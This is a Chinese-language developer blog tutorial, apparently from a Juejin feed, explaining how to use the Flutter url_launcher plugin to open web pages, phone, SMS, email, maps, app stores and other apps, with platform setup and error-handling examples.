pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>在移动应用开发中，打开外部链接、发送邮件、拨打电话等功能是提升用户体验的常见需求。无论是跳转到网页、启动地图导航，还是调用系统邮件客户端，都需要与设备的原生功能进行交互。<strong>url_launcher</strong> 作为 Flutter 生态中最常用的链接跳转插件，能够无缝衔接 Android 和 iOS 平台的原生能力，让开发者无需深入原生代码即可实现各类链接打开功能。本文将详细介绍 url_launcher 的核心用法、场景实践与常见问题解决方案，帮助你在 Flutter 项目中轻松实现链接跳转功能。</p>
<h2 data-id="heading-0">1. 前言</h2>
<p>在 Flutter 应用中，直接操作设备的原生功能（如打开浏览器、拨打电话）需要通过<strong>平台通道（Platform Channel）</strong> 与原生代码通信，这对不熟悉原生开发的 Flutter 开发者来说存在一定门槛。url_launcher 插件封装了 Android 和 iOS 平台的链接处理逻辑，提供了统一的 Dart API，开发者只需调用简单方法即可实现：</p>
<ul>
<li>打开网页链接（HTTP/HTTPS）</li>
<li>拨打电话、发送短信</li>
<li>发送邮件（支持指定主题和内容）</li>
<li>启动地图应用导航</li>
<li>打开应用商店评分页面</li>
<li>跳转至其他应用（通过应用 scheme）</li>
</ul>
<h3 data-id="heading-1">url_launcher 的核心优势</h3>
<ul>
<li><strong>跨平台兼容</strong>：完美支持 Android 和 iOS，自动适配平台差异（如 iOS 需要配置 <code>Info.plist</code> 权限）。</li>
<li><strong>API 简洁易用</strong>：通过 <code>launchUrl</code> 单一方法即可处理多种链接类型，无需区分平台编写适配代码。</li>
<li><strong>支持多种链接协议</strong>：除 HTTP/HTTPS 外，还支持 <code>tel:</code>（电话）、<code>sms:</code>（短信）、<code>mailto:</code>（邮件）、<code>geo:</code>（地图）等多种 URI 协议。</li>
<li><strong>状态反馈完善</strong>：提供链接是否可打开的检查方法（<code>canLaunchUrl</code>），以及启动结果的回调，便于处理异常场景。</li>
</ul>
<h2 data-id="heading-2">2. 快速开始：安装与基础配置</h2>
<h3 data-id="heading-3">2.1 安装插件</h3>
<p>在 <code>pubspec.yaml</code> 文件中添加 url_launcher 依赖，最新版本可从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Furl_launcher" target="_blank" title="https://pub.dev/packages/url_launcher" ref="nofollow noopener noreferrer">pub.dev</a> 获取：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>
  <span class="hljs-attr">url_launcher:</span> <span class="hljs-string">^6.2.5</span>  <span class="hljs-comment"># 请使用最新版本</span>
</code></pre>
<p>执行 <code>flutter pub get</code> 安装依赖：</p>
<pre><code class="hljs language-bash" lang="bash">flutter pub get
</code></pre>
<h3 data-id="heading-4">2.2 平台配置（关键步骤）</h3>
<p>url_launcher 需要根据不同平台进行额外配置，否则可能出现功能异常（如无法打开链接、应用崩溃）。</p>
<h4 data-id="heading-5">Android 平台配置</h4>
<p>无需额外权限配置，但如果需要打开 HTTP 链接（非 HTTPS），需在 <code>android/app/src/main/AndroidManifest.xml</code> 中添加网络权限，并配置 cleartext 支持：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 允许网络访问 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.permission.INTERNET"</span> /&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">application</span>
    <span class="hljs-attr">...</span>
    <span class="hljs-attr">android:usesCleartextTraffic</span>=<span class="hljs-string">"true"</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 允许 HTTP 链接 --&gt;</span>
    ...
<span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">iOS 平台配置</h4>
<p>iOS 要求所有外部链接跳转必须在 <code>Info.plist</code> 中声明允许的 URL 方案（Scheme），否则会被系统拦截。在 <code>ios/Runner/Info.plist</code> 中添加以下配置（根据应用需求选择）：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 允许打开网页（HTTP/HTTPS） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>LSApplicationQueriesSchemes<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>https<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>tel<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 允许拨打电话 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>sms<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 允许发送短信 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mailto<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 允许发送邮件 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>geo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 允许地图导航 --&gt;</span>
    <span class="hljs-comment">&lt;!-- 如需跳转其他应用，添加对应 scheme，如微信：weixin --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
</code></pre>
<h2 data-id="heading-7">3. 核心 API 详解</h2>
<p>url_launcher 的核心功能通过以下两个方法实现，掌握这两个方法即可覆盖大部分使用场景：</p>
<h3 data-id="heading-8">3.1 检查链接是否可打开：<code>canLaunchUrl</code></h3>
<p>在尝试打开链接前，建议先调用 <code>canLaunchUrl</code> 检查设备是否支持该链接类型（如某些设备可能没有安装地图应用），避免直接启动失败。</p>
<p><strong>方法定义</strong>：</p>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-built_in">bool</span>&gt; canLaunchUrl(<span class="hljs-built_in">Uri</span> url)
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>url</code>：需要检查的链接，必须是 <code>Uri</code> 类型（通过 <code>Uri.parse()</code> 转换）。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li><code>Future&lt;bool&gt;</code>：<code>true</code> 表示支持打开，<code>false</code> 表示不支持。</li>
</ul>
<h3 data-id="heading-9">3.2 打开链接：<code>launchUrl</code></h3>
<p>这是 url_launcher 的核心方法，用于启动链接对应的应用或功能。</p>
<p><strong>方法定义</strong>：</p>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-built_in">bool</span>&gt; launchUrl(
  <span class="hljs-built_in">Uri</span> url, {
  LaunchMode mode = LaunchMode.platformDefault,
  WebViewConfiguration webViewConfiguration = <span class="hljs-keyword">const</span> WebViewConfiguration(),
  <span class="hljs-built_in">String?</span> webOnlyWindowName,
})
</code></pre>
<p><strong>关键参数说明</strong>：</p>
<ul>
<li><code>url</code>：需要打开的链接（<code>Uri</code> 类型），如 <code>Uri.parse('https://flutter.dev')</code>。</li>
<li><code>mode</code>：启动模式（控制链接打开方式），常用值：
<ul>
<li><code>LaunchMode.platformDefault</code>：默认模式，Android 通常用浏览器打开，iOS 可能用应用内 WebView。</li>
<li><code>LaunchMode.externalApplication</code>：强制用外部应用打开（如系统浏览器）。</li>
<li><code>LaunchMode.inAppWebView</code>：在应用内 WebView 打开（仅支持 HTTP/HTTPS 链接）。</li>
</ul>
</li>
<li><code>webViewConfiguration</code>：应用内 WebView 的配置（如是否允许 JavaScript、缩放等）。</li>
</ul>
<h2 data-id="heading-10">4. 实战场景：常见链接类型的使用示例</h2>
<h3 data-id="heading-11">4.1 打开网页链接（HTTP/HTTPS）</h3>
<p>最常用的场景，支持在外部浏览器或应用内 WebView 打开网页。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:url_launcher/url_launcher.dart'</span>;

<span class="hljs-comment">// 打开外部浏览器</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _launchWebUrl() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> url = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://flutter.dev'</span>);
  <span class="hljs-comment">// 检查是否支持打开链接</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">await</span> canLaunchUrl(url)) {
    <span class="hljs-comment">// 不支持时提示用户</span>
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'无法打开链接：<span class="hljs-subst">${url.toString()}</span>'</span>)),
    );
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// 用外部应用打开网页</span>
  <span class="hljs-keyword">await</span> launchUrl(url, mode: LaunchMode.externalApplication);
}

<span class="hljs-comment">// 在应用内 WebView 打开（适合需要保持应用上下文的场景）</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _launchInAppWebView() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> url = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://pub.dev'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(url)) {
    <span class="hljs-keyword">await</span> launchUrl(
      url,
      mode: LaunchMode.inAppWebView,
      <span class="hljs-comment">// 配置 WebView 允许 JavaScript</span>
      webViewConfiguration: WebViewConfiguration(
        enableJavaScript: <span class="hljs-keyword">true</span>,
      ),
    );
  }
}
</code></pre>
<p>在 UI 中添加按钮调用方法：</p>
<pre><code class="hljs language-dart" lang="dart">ElevatedButton(
  onPressed: _launchWebUrl,
  child: Text(<span class="hljs-string">'打开 Flutter 官网'</span>),
),
ElevatedButton(
  onPressed: _launchInAppWebView,
  child: Text(<span class="hljs-string">'应用内打开 Pub 仓库'</span>),
),
</code></pre>
<h3 data-id="heading-12">4.2 拨打电话与发送短信</h3>
<p>通过 <code>tel:</code> 和 <code>sms:</code> 协议实现电话拨打和短信发送功能，需注意设备是否有通话/短信功能（如平板可能不支持）。</p>
<h4 data-id="heading-13">拨打电话</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 拨打电话（直接拨号，无需用户输入）</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _makePhoneCall() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> phoneUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'tel:10086'</span>); <span class="hljs-comment">// 电话号码</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(phoneUri)) {
    <span class="hljs-keyword">await</span> launchUrl(phoneUri);
  } <span class="hljs-keyword">else</span> {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'无法拨打电话：10086'</span>)),
    );
  }
}
</code></pre>
<h4 data-id="heading-14">发送短信</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 发送短信（预填收件人和内容）</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _sendSms() <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// sms:收件人?body=短信内容</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> smsUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'sms:10086?body=查询话费余额'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(smsUri)) {
    <span class="hljs-keyword">await</span> launchUrl(smsUri);
  } <span class="hljs-keyword">else</span> {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'无法发送短信'</span>)),
    );
  }
}
</code></pre>
<h3 data-id="heading-15">4.3 发送邮件（支持主题和内容）</h3>
<p>通过 <code>mailto:</code> 协议调用系统邮件客户端，可指定收件人、主题、正文内容。</p>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; _sendEmail() <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// mailto:收件人?subject=主题&amp;body=正文</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> emailUri = <span class="hljs-built_in">Uri</span>.parse(
    <span class="hljs-string">'mailto:support@example.com?subject=反馈问题&amp;body=您好，我的应用遇到了以下问题：'</span>,
  );
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(emailUri)) {
    <span class="hljs-keyword">await</span> launchUrl(emailUri);
  } <span class="hljs-keyword">else</span> {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'未检测到邮件客户端'</span>)),
    );
  }
}
</code></pre>
<h3 data-id="heading-16">4.4 地图导航（打开地图应用）</h3>
<p>通过 <code>geo:</code> 协议启动地图应用，支持指定坐标、地址或搜索关键词。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 打开地图导航到指定坐标（纬度,经度）</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _launchMap() <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// geo:纬度,经度?q=搜索关键词（可选）</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> mapUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'geo:39.908823,116.397470?q=北京天安门'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(mapUri)) {
    <span class="hljs-keyword">await</span> launchUrl(mapUri);
  } <span class="hljs-keyword">else</span> {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'未检测到地图应用'</span>)),
    );
  }
}
</code></pre>
<h3 data-id="heading-17">4.5 打开应用商店评分页面</h3>
<p>引导用户到应用商店给应用评分，需替换为自己的应用 ID。</p>
<h4 data-id="heading-18">Android（Google Play）</h4>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; _launchGooglePlay() <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 替换为你的应用包名</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> packageName = <span class="hljs-string">'com.example.myapp'</span>;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> playStoreUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://play.google.com/store/apps/details?id=<span class="hljs-subst">$packageName</span>'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(playStoreUri)) {
    <span class="hljs-keyword">await</span> launchUrl(playStoreUri, mode: LaunchMode.externalApplication);
  }
}
</code></pre>
<h4 data-id="heading-19">iOS（App Store）</h4>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; _launchAppStore() <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 替换为你的应用 ID（从 App Store 获取）</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> appId = <span class="hljs-string">'1234567890'</span>;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> appStoreUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://apps.apple.com/cn/app/id<span class="hljs-subst">$appId</span>'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(appStoreUri)) {
    <span class="hljs-keyword">await</span> launchUrl(appStoreUri, mode: LaunchMode.externalApplication);
  }
}
</code></pre>
<h3 data-id="heading-20">4.6 跳转至其他应用（通过 Scheme）</h3>
<p>某些应用提供了自定义 Scheme 用于外部跳转（如微信的 <code>weixin://</code>、支付宝的 <code>alipay://</code>），需提前确认目标应用的 Scheme 格式。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 打开微信（需微信已安装）</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; _launchWeChat() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> wechatUri = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'weixin://'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(wechatUri)) {
    <span class="hljs-keyword">await</span> launchUrl(wechatUri);
  } <span class="hljs-keyword">else</span> {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(<span class="hljs-string">'未安装微信'</span>)),
    );
  }
}
</code></pre>
<blockquote>
<p><strong>注意</strong>：iOS 需在 <code>Info.plist</code> 的 <code>LSApplicationQueriesSchemes</code> 中添加对应 Scheme（如 <code>weixin</code>），否则 <code>canLaunchUrl</code> 会返回 <code>false</code>。</p>
</blockquote>
<h2 data-id="heading-21">5. 高级用法：自定义 WebView 与错误处理</h2>
<h3 data-id="heading-22">5.1 自定义应用内 WebView 配置</h3>
<p>使用 <code>LaunchMode.inAppWebView</code> 时，可通过 <code>WebViewConfiguration</code> 定制 WebView 行为，如启用 JavaScript、设置用户代理等。</p>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; _launchCustomWebView() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Uri</span> url = <span class="hljs-built_in">Uri</span>.parse(<span class="hljs-string">'https://flutter.dev'</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">await</span> canLaunchUrl(url)) {
    <span class="hljs-keyword">await</span> launchUrl(
      url,
      mode: LaunchMode.inAppWebView,
      webViewConfiguration: WebViewConfiguration(
        enableJavaScript: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// 允许 JavaScript</span>
        enableDomStorage: <span class="hljs-keyword">true</span>, <span class="hljs-comment">// 允许 DOM 存储</span>
        userAgent: <span class="hljs-string">'MyFlutterApp/1.0'</span>, <span class="hljs-comment">// 自定义用户代理</span>
        <span class="hljs-comment">// 禁止缩放</span>
        supportZoom: <span class="hljs-keyword">false</span>,
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-23">5.2 完善的错误处理与状态反馈</h3>
<p>实际开发中需处理各种异常场景（如链接无效、无网络、应用未安装等），通过 <code>try-catch</code> 和状态提示提升用户体验。</p>
<pre><code class="hljs language-dart" lang="dart">Future&lt;<span class="hljs-keyword">void</span>&gt; _safeLaunchUrl(<span class="hljs-built_in">Uri</span> url) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 检查是否支持打开</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">await</span> canLaunchUrl(url)) {
      _showError(<span class="hljs-string">'无法打开链接：<span class="hljs-subst">${url.toString()}</span>'</span>);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-comment">// 尝试打开链接</span>
    <span class="hljs-keyword">final</span> <span class="hljs-built_in">bool</span> launched = <span class="hljs-keyword">await</span> launchUrl(url);
    <span class="hljs-keyword">if</span> (!launched) {
      _showError(<span class="hljs-string">'打开链接失败，请重试'</span>);
    }
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-comment">// 捕获异常（如网络错误、权限问题）</span>
    _showError(<span class="hljs-string">'发生错误：<span class="hljs-subst">${e.toString()}</span>'</span>);
  }
}

<span class="hljs-comment">// 显示错误提示</span>
<span class="hljs-keyword">void</span> _showError(<span class="hljs-built_in">String</span> message) {
  ScaffoldMessenger.of(context).showSnackBar(
    SnackBar(
      content: Text(message),
      backgroundColor: Colors.red,
    ),
  );
}
</code></pre>
<h2 data-id="heading-24">6. 常见问题与解决方案</h2>
<h3 data-id="heading-25">6.1 链接无法打开，<code>canLaunchUrl</code> 返回 false</h3>
<ul>
<li><strong>iOS 未配置 Scheme</strong>：检查 <code>Info.plist</code> 中的 <code>LSApplicationQueriesSchemes</code> 是否添加了对应协议（如 <code>http</code>、<code>tel</code>）。</li>
<li><strong>链接格式错误</strong>：确保通过 <code>Uri.parse()</code> 正确转换链接，避免手动拼接字符串导致格式错误（如空格未编码）。</li>
<li><strong>应用未安装</strong>：跳转其他应用（如微信）时，需确保目标应用已安装，否则 <code>canLaunchUrl</code> 会返回 false。</li>
</ul>
<h3 data-id="heading-26">6.2 Android 打开 HTTP 链接失败</h3>
<ul>
<li>需在 <code>AndroidManifest.xml</code> 中添加 <code>android:usesCleartextTraffic="true"</code> 允许 HTTP 流量（见 2.2 节配置）。</li>
<li>建议优先使用 HTTPS 链接，避免 Android 高版本的安全限制。</li>
</ul>
<h3 data-id="heading-27">6.3 应用内 WebView 无法加载 JavaScript</h3>
<ul>
<li>需在 <code>WebViewConfiguration</code> 中设置 <code>enableJavaScript: true</code>，默认是禁用的。</li>
</ul>
<h3 data-id="heading-28">6.4 iOS 跳转应用商店提示“无法打开页面”</h3>
<ul>
<li>确保 App Store 链接正确（格式为 <code>https://apps.apple.com/cn/app/id[应用ID]</code>）。</li>
<li>测试设备需登录 Apple ID，且应用已上架 App Store（开发中的应用可通过 TestFlight 测试）。</li>
</ul>
<h2 data-id="heading-29">7. 总结</h2>
<p>url_launcher 作为 Flutter 开发中的必备插件，以简洁的 API 和强大的跨平台能力，完美解决了链接跳转与原生应用交互的需求。无论是基础的网页打开、电话拨打，还是复杂的应用内 WebView 集成、第三方应用跳转，都能通过它轻松实现。</p>
<p>使用时需注意：</p>
<ol>
<li>严格按照平台要求配置权限（尤其是 iOS 的 <code>Info.plist</code>）；</li>
<li>打开链接前务必通过 <code>canLaunchUrl</code> 检查兼容性；</li>
<li>针对不同场景选择合适的启动模式（外部应用/应用内 WebView）；</li>
<li>完善错误处理，为用户提供清晰的反馈。</li>
</ol>
<p><strong>参考资源</strong></p>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Furl_launcher" target="_blank" title="https://pub.dev/packages/url_launcher" ref="nofollow noopener noreferrer">url_launcher 官方文档</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.flutter.dev%2Fcookbook%2Fnavigation%2Flaunch-url" target="_blank" title="https://docs.flutter.dev/cookbook/navigation/launch-url" ref="nofollow noopener noreferrer">Flutter 官方 URI 处理指南</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fguide%2Ftopics%2Fmanifest%2Fmanifest-intro" target="_blank" title="https://developer.android.com/guide/topics/manifest/manifest-intro" ref="nofollow noopener noreferrer">Android Manifest 配置参考</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Fbundleresources%2Finformation_property_list" target="_blank" title="https://developer.apple.com/documentation/bundleresources/information_property_list" ref="nofollow noopener noreferrer">iOS Info.plist 配置参考</a></p>
</li>
</ul>
<hr/>
<blockquote>
<p>本次分享就到这儿啦，我是鹏多多，深耕前端的技术创作者，如果您看了觉得有帮助，欢迎评论，关注，点赞，转发，我们下次见~</p>
</blockquote>
<p>PS：在本页按F12，在console中输入document.getElementsByClassName('panel-btn')[0].click();有惊喜哦~</p>
<p><code>往期文章</code></p>
<ul>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutter图片选择库multi_image_picker_plus和image_picker的对比和使用解析</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">解锁flutter弹窗新姿势：dialog-flutter_smart_dialog插件解读+案例</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-切换状态显示不同组件10种实现方案全解析</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-详解控制组件显示的两种方式Offstage与Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-使用AnimatedDefaultTextStyle实现文本动画</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-使用SafeArea组件处理各机型的安全距离</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-实现渐变色边框背景以及渐变色文字</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-使用confetti制作炫酷纸屑爆炸粒子动画</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 核心方法深度解析：手写 call、apply、bind 和 Object.create]]></title>    <link>https://juejin.cn/post/7579066828179882020</link>    <guid>https://juejin.cn/post/7579066828179882020</guid>    <pubDate>2025-12-02T16:26:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579066828179882020" data-draft-id="7579101504289669174" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 核心方法深度解析：手写 call、apply、bind 和 Object.create"/> <meta itemprop="keywords" content="前端,JavaScript,ECMAScript 6"/> <meta itemprop="datePublished" content="2025-12-02T16:26:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024肥宅"/> <meta itemprop="url" content="https://juejin.cn/user/588993964030574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 核心方法深度解析：手写 call、apply、bind 和 Object.create
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993964030574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024肥宅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-02T16:26:41.000Z" title="Tue Dec 02 2025 16:26:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    37
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
